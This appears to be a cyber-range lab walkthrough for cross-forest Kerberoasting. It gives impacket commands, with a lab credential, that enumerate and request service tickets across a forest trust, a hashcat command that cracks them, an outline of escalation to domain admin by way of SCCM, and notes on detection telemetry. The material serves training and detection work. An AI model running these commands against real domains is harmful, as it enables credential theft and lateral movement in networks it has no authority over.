# WT#033 — Cross-forest Kerberoast

## Metadata

| Field | Value |
|-------|-------|
| **Target VM** | dc03 (192.168.77.12), range.local |
| **Domain** | cadre.local → range.local (forest trust) |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | impacket, hashcat |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1558.003 |
| **Difficulty** | Medium |

## Prerequisites

- Valid `cadre.local` domain credentials (`analyst_dfir`)
- Bidirectional forest trust between `cadre.local` and `range.local`
- Conditional forwarders configured for cross-forest DNS resolution
- Network access to dc03 (192.168.77.12)

## Attack Steps

### Step 1: Recon — Enumerate cross-forest SPNs

```bash
impacket-GetUserSPNs cadre.local/analyst_dfir:'An@lyst_DF1R!' -target-domain range.local -dc-ip 192.168.77.12
```

### Step 2: Exploit — Request TGS across trust boundary

```bash
impacket-GetUserSPNs cadre.local/analyst_dfir:'An@lyst_DF1R!' -target-domain range.local -dc-ip 192.168.77.12 -request -outputfile crossforest_tgs.txt
```

### Step 3: Verify — Crack the hash

```bash
hashcat -m 19700 crossforest_tgs.txt /usr/share/wordlists/rockyou.txt --force
```

## Post-Exploitation Chain

AES256 TGS hash (hashcat 19700) → crack → `svc_sccm` plaintext password in `range.local` → SCCM administrator access → SCCM client push relay → compromise machines in `range.local` → potential DA in external forest

This demonstrates the trust attack surface — a low-privileged `cadre.local` user can Kerberoast SPNs in `range.local` despite SID filtering being enabled on the trust.

## Telemetry Verification

- **Elastic Index:** `logs-system.security-*`
- **Detection Rule:** No dedicated cross-forest Kerberoast detection rule
- **Expected Event:** Event ID 4769 on dc03 with ServiceName:HTTP/mbr02.range.local, originating from a cadre.local IP (192.168.77.x)
- **Note:** Cross-forest TGS requests are legitimate Kerberos traffic in multi-forest environments. Detection requires establishing a baseline of cross-forest authentication and alerting on anomalous volumes or patterns

## Status

CONFIGURED
